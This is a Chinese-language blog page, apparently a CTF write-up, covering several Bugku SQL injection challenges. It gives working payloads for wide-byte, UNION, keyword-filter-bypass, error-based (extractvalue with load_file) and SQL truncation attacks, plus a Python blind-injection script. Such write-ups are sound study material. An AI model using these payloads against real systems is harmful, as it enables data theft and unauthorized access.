@@ -1,0 +1,797 @@
+<!DOCTYPE html>
+<html>
+    <!-- title -->
+
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" >
+    <meta name="author" content="John Doe">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="John Doe">
+    <meta name="keywords" content="Hexo | John Doe">
+    <meta name="description" content="">
+    <meta name="Cache-Control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+    <title>Bugku SQL注入题目总结 · Nancy&#39;s Studio</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s 1;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href= /css/style.css?v=20180721 as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    <link rel="stylesheet" href= /css/mobile.css?v=20180721 media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href= "/assets/pic1.jpg" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script" />
+    <link rel="preload" href="/scripts/main.js" as="script" />
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >Nancy&#39;s Studio.</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">Bugku SQL注入题目总结</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>Nancy's Studio.</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style=
+
+
+
+
+
+
+
+
+height:50vh;
+
+>
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            Bugku SQL注入题目总结
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "SQL">SQL</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "BugkuCTF">BugkuCTF</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>Word count: <span class="post-count">1,702</span> / Reading time: <span class="post-count">7 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2018/08/25</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h1 id="Bugku-SQL注入题目总结"><a href="#Bugku-SQL注入题目总结" class="headerlink" title="Bugku SQL注入题目总结"></a>Bugku SQL注入题目总结</h1><h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p>查看源码发现网页编码为gb2312，猜测考的是宽字节注入。</p>
+<p>关于宽字节注入可以参考大佬的详解：<a href="https://www.leavesongs.com/PENETRATION/mutibyte-sql-inject.html" target="_blank" rel="noopener">戳这里</a></p>
+<p>果然输入<code>?id=1%df&#39;</code>出现了报错，说明已经可以注入了。<code>1%df%27</code>被转换成了<code>1運</code>，原因就是单引号前被添加了转义符<code>\</code>，即<code>%5c</code>，在这里前面的<code>%df</code>和<code>%5c</code>结合形成了汉字，导致单引号成功逃逸。下面就可以直接操作了。</p>
+<p><code>?id=1%df&#39;and version()&gt;0 --+</code>返回正确，说明数据库可能是sqlserver或者mysql</p>
+<p><code>?id=1%bf&#39; and length(user())&gt;0 --+</code>返回正确，说明存在user()函数，数据库为mysql</p>
+<p><code>?id=1%df&#39; order by 2 --+</code>正常回显，<code>?id=1%df&#39; order by 3 --+</code>报错，证明一共有两列</p>
+<p><code>?id=1%df&#39; union select database(),2 --+</code>得数据库名sql5</p>
+<p>已知表名为key，字段名为string，直接构造<code>?id=1%df&#39; union select 1,string from sql5.key --+</code></p>
+<h2 id="SQL注入1"><a href="#SQL注入1" class="headerlink" title="SQL注入1"></a>SQL注入1</h2><p>题目过滤了关键字</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//过滤sql</span></span><br><span class="line">$array = <span class="keyword">array</span>(<span class="string">'table'</span>,<span class="string">'union'</span>,<span class="string">'and'</span>,<span class="string">'or'</span>,<span class="string">'load_file'</span>,<span class="string">'create'</span>,<span class="string">'delete'</span>,<span class="string">'select'</span>,<span class="string">'update'</span>,<span class="string">'sleep'</span>,<span class="string">'alter'</span>,<span class="string">'drop'</span>,<span class="string">'truncate'</span>,<span class="string">'from'</span>,<span class="string">'max'</span>,<span class="string">'min'</span>,<span class="string">'order'</span>,<span class="string">'limit'</span>);</span><br><span class="line"><span class="keyword">foreach</span> ($array <span class="keyword">as</span> $value)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (substr_count($id, $value) &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">'包含敏感关键字！'</span>.$value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//xss过滤</span></span><br><span class="line">$id = strip_tags($id);</span><br><span class="line"></span><br><span class="line">$query = <span class="string">"SELECT * FROM temp WHERE id=&#123;$id&#125; LIMIT 1"</span>;</span><br></pre></td></tr></table></figure>
+<p>但是往后看发现这句<code>$id = strip_tags($id);</code>，strip_tags() 函数可以剥去字符串中的 HTML、XML 以及 PHP 的标签，这样就可以利用&lt;&gt;绕过。</p>
+<p><code>?id=1 un&lt;&gt;ion sel&lt;&gt;ect 1,database()--+</code>得数据库名sql3</p>
+<p>根据已知条件构造<code>?id=1 un&lt;&gt;ion sel&lt;&gt;ect 1,hash fr&lt;&gt;om sql3.key --+</code>得flag</p>
+<h2 id="成绩单"><a href="#成绩单" class="headerlink" title="成绩单"></a>成绩单</h2><p>这里<code>--+</code>被过滤了，用<code>#</code>注释</p>
+<p>试着输入<code>0&#39; or 1=1 union select 1,2 #</code>，<code>0&#39;or 1=1 union select 1,2,3 #</code>无回显，<code>0&#39; or 1=1 union select 1,2,3,4 #</code>正常显示</p>
+<p>所以输入<code>0&#39; union select database(),null,null,null #</code>得数据库名skctf_flag</p>
+<p><code>0&#39; union select table_name,2,3,4 from information_schema.tables where table_schema = &#39;skctf_flag&#39;#</code>得表名fl4g</p>
+<p><code>0&#39; union select column_name,2,3,4 from information_schema.columns where table_name=&#39;fl4g&#39; #</code>得列名skctf_flag</p>
+<p>最后一步<code>0&#39; union select skctf_flag,2,3,4 from fl4g #</code>得flag</p>
+<h2 id="login1"><a href="#login1" class="headerlink" title="login1"></a>login1</h2><p>提示SQL约束攻击，这里可以先了解一下约束攻击什么意思，附链接：<a href="http://goodwaf.com/2016/12/30/基于约束条件的SQL攻击/" target="_blank" rel="noopener">戳这里</a></p>
+<p>大概意思是在SQL中执行字符串处理时，字符串末尾的空格符将会被删除。换句话说”admin”等同于”admin “。例如以下语句的查询结果，与使用用户名”admin”进行查询时的结果是一样的。  <code>SELECT * FROM users WHERE username=&#39;admin &#39;;</code> </p>
+<p>现在可以试着操作了。点进去是个登陆页面，还看到了注册链接。先随便注册一个然后登陆，显示<code>不是管理员还想看flag？！</code>。。想知道管理员用户名然后尝试注入发现没啥用，于是去注册页面试着以admin为用户名注册，页面提示admin已存在 。好的这下好办了，根据提示得SQL约束攻击，直接去注册一个账号用户名叫’admin ‘（admin后加空格），设置密码，再去登陆得flag。 </p>
+<h2 id="这是一个神奇的登陆框"><a href="#这是一个神奇的登陆框" class="headerlink" title="这是一个神奇的登陆框"></a>这是一个神奇的登陆框</h2><p>试着输入发现单引号被过滤了，但是双引号没被过滤。</p>
+<p><code>0&quot; or 1=1 order by 2 #</code>正常回显，<code>0&quot; or 1=1 order by 3 #</code>显示错误，说明有两列。</p>
+<p><code>0&quot; union select database(),null #</code>得数据库名bugkusql1</p>
+<p><code>0&quot; union select table_name,null from information_schema.tables where table_schema=&#39;bugkusql1&#39; #</code>得表名flag1</p>
+<p><code>0&quot; union select column_name,null from information_schema.columns where table_name=&#39;flag1&#39; #</code>得列名flag1</p>
+<p>最后<code>0&quot; union select flag1,null from bugkusql1.flag1 #</code>得flag</p>
+<h2 id="多次"><a href="#多次" class="headerlink" title="多次"></a>多次</h2><p>点进去就会注意到<code>?id=1</code>，说明这个很有可能是个注入题，加单引号出错，确实可以注入。</p>
+<p>可是不知道过滤了什么，这里可以使用异或来判断有哪些关键词被过滤了。</p>
+<p>一上来先试试行不行<code>?id=1&#39;^(0)--+</code>页面返回正确，再输入<code>?id=1&#39;^(1)--+</code>显示错误，说明如果页面显示有误那么括号里的内容应该为真。这里可以用length()函数判断有哪些关键词被过滤了。</p>
+<p><code>?id=1&#39;^(length(&#39;union&#39;)&gt;0)--+</code>页面返回正确，说明union被过滤了。</p>
+<p>同理，用这种方法验证一些其他的常用关键词，会发现union，select，and，or被过滤了，但是可以构造类似ununionion的形式绕过。</p>
+<p><code>?id=0&#39; ununion selselectect 1,2--+</code>在2位上有回显</p>
+<p><code>?id=0&#39; ununionion selselectect 1,database()--+</code>得库名web1002-1</p>
+<p><code>?id=0&#39; ununionion selselectect 1,(selselectect table_name from infoorrmation_schema.tables where table_schema=&#39;web1002-1&#39; limit 0,1)--+</code>得表名flag1，改变limit发现另一个表hint。（这个information好坑，里面有or。。。）</p>
+<p><code>?id=0&#39; ununionion selselectect 1,(selselectect column_name from infoorrmation_schema.columns where table_name=&#39;flag1&#39; limit 0,1)--+</code>得字段名flag1，还有一个叫address。同理查出hint表里有id和contents字段。</p>
+<p><code>?id=0&#39; ununionion selselectect 1,(selselectect flag1 from flag1 limit 0,1)--+</code>得到<code>usOwycTju+FTUUzXosjr</code>，这个应该是第一个flag了。</p>
+<p>然后去访问address，因该会有下一关地址。<code>?id=0&#39; ununionion selselectect 1,(selselectect address from flag1 limit 0,1)--+</code>得到<code>./Once_More.php</code></p>
+<p>进入第二关，加单引号出现报错，开始注入。观察Id的回显发现union和加号都被过滤了，再试试别的关键词，sleep和substr也被过滤掉了。用ununionion后面的select也没了，换ununionion selselectect试试，这次好像没啥问题，结果不回显了。。</p>
+<p>于是到这就注不下去了（咸鱼的我），看网上大佬们写了脚本爆破，借此机会学习下。</p>
+<p>贴上大佬的脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flag2</span><span class="params">()</span>:</span></span><br><span class="line">    flag =<span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> xrange(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">        temp = <span class="string">'!@$%^&amp;*()_+=-|&#125;&#123;POIU YTREWQASDFGHJKL:?&gt;&lt;MNBVCXZqwertyuiop[];lkjhgfdsazxcvbnm,./1234567890`~'</span></span><br><span class="line">        key = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> temp:</span><br><span class="line">            url = <span class="string">"http://120.24.86.145:9004/Once_More.php?id=1'and  (select locate(binary'"</span>+str(i)+<span class="string">"',(select flag2 from flag2),"</span>+str(j)+<span class="string">"))="</span>+str(j)+<span class="string">"%23"</span></span><br><span class="line">            r1 = rs.get(url)</span><br><span class="line">            <span class="comment"># print url</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">"Hello"</span> <span class="keyword">in</span> r1.text:</span><br><span class="line">                <span class="keyword">print</span> str(i)+<span class="string">" -----"</span>+str(j)</span><br><span class="line">                flag += str(i)</span><br><span class="line">                <span class="keyword">print</span> <span class="string">"[*] : "</span>+flag</span><br><span class="line">                key = <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> key ==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+<p>加点东西然后运行一下得到最终的flag</p>
+<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>附报错注入相关知识的连接：<a href="https://blog.csdn.net/qq_35544379/article/details/77453019" target="_blank" rel="noopener">戳这里</a>，<a href="http://blog.51cto.com/wt7315/1891458" target="_blank" rel="noopener">这个也不错</a>，<a href="https://blog.csdn.net/zpy1998zpy/article/details/80631036" target="_blank" rel="noopener">还有这个</a></p>
+<p>这题链接打不开了，用别人的解题思路总结一下</p>
+<p>题目提示不可以包含’’–’’，空格，单引号，双引号，’’union’’关键字。这里可以用换行符替换空格。</p>
+<p>通过extractvalue报错 <code>?id=1%0Aand%0Aextractvalue(1,concat(0x7e,(select%0A@@version),0x7e))</code>成功报错</p>
+<p>题目要求读文件双引号里面的内容（即flag），需要查询的文件路径为<code>/var/test/key_1.php</code>，文件名转十六进制表示<code>0x2f7661722f746573742f6b65795f312e706870</code></p>
+<p>现在读取文件 <code>?id=1%0Aand%0Aextractvalue(1,concat(0x7e,(hex(load_file(0x2f7661722f746573742f6b65795f312e706870))),0x7e))</code> </p>
+<p>但是extractvalue只能读32位（转换成字符串只有16位），其实是被截断了，可以用substr(str,start,length)读取剩余部分<code>id=1%0Aand%0Aextractvalue(1,concat(0x7e,substr(hex(load_file(0x2f7661722f746573742f6b65795f312e706870))%0Afrom%0A161%0Afor%0A20),0x7e))</code></p>
+<p>接下来修改偏移量把整个文件读完就可以了，最后恢复的文件内容如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> fdsafasfdsafidsafdsaifdsakfdsaifdsafdsafdsafdsafkdsa;fdsafdsafsdafdsafas0hfdsg9Flag:<span class="string">"7249f5a7fd1de602b30e6f39aea6193a"</span>fsdafsafdsafdsafdsafa <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+    </article>
+    <!-- license  -->
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href= "/2018/08/31/Sqli-Labs-Study/" title= Sqli-Labs Study >
+                    <div class="nextTitle">Sqli-Labs Study</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2018/08/11/New-Start/" title= New Start >
+                    <div class="prevTitle">New Start</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!--PC和WAP自适应版-->
+
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:643342586@qq.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/CallMeSaltyF1sh" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+            
+                <span class="iconfont-archer wechat" title=wechat>
+                  
+                  <img class="profile-qr" src="/assets/mmqrcode.png" />
+                </span>
+            
+        
+    
+        
+            
+                <span class="iconfont-archer qq" title=qq>
+                  
+                  <img class="profile-qr" src="/assets/qq_qrcode.jpg" />
+                </span>
+            
+        
+    
+        
+            
+                <a href="//m.weibo.cn/u/6067406461?from=1088195010&wm=9006_2001&sourceType=qq&uid=6067406461" class="iconfont-archer weibo" target="_blank" title=weibo></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Bugku-SQL注入题目总结"><span class="toc-number">1.</span> <span class="toc-text">Bugku SQL注入题目总结</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#sql注入"><span class="toc-number">1.1.</span> <span class="toc-text">sql注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL注入1"><span class="toc-number">1.2.</span> <span class="toc-text">SQL注入1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#成绩单"><span class="toc-number">1.3.</span> <span class="toc-text">成绩单</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#login1"><span class="toc-number">1.4.</span> <span class="toc-text">login1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#这是一个神奇的登陆框"><span class="toc-number">1.5.</span> <span class="toc-text">这是一个神奇的登陆框</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#多次"><span class="toc-number">1.6.</span> <span class="toc-text">多次</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#报错注入"><span class="toc-number">1.7.</span> <span class="toc-text">报错注入</span></a></li></ol></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 5
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/05</span><a class="archive-post-title" href= "/2019/02/05/Ajax学习笔记/" >Ajax学习笔记</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/12</span><a class="archive-post-title" href= "/2018/11/12/深入学习CSS布局/" >深入学习CSS布局</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/31</span><a class="archive-post-title" href= "/2018/08/31/Sqli-Labs-Study/" >Sqli-Labs Study</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/25</span><a class="archive-post-title" href= "/2018/08/25/Bugku-SQL注入题目总结/" >Bugku SQL注入题目总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/11</span><a class="archive-post-title" href= "/2018/08/11/New-Start/" >New Start</a>
+        </li>
+    
+    </div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="Life"><span class="iconfont-archer">&#xe606;</span>Life</span>
+    
+        <span class="sidebar-tag-name" data-tags="Ajax"><span class="iconfont-archer">&#xe606;</span>Ajax</span>
+    
+        <span class="sidebar-tag-name" data-tags="SQL"><span class="iconfont-archer">&#xe606;</span>SQL</span>
+    
+        <span class="sidebar-tag-name" data-tags="BugkuCTF"><span class="iconfont-archer">&#xe606;</span>BugkuCTF</span>
+    
+        <span class="sidebar-tag-name" data-tags="CSS"><span class="iconfont-archer">&#xe606;</span>CSS</span>
+    
+    </div>
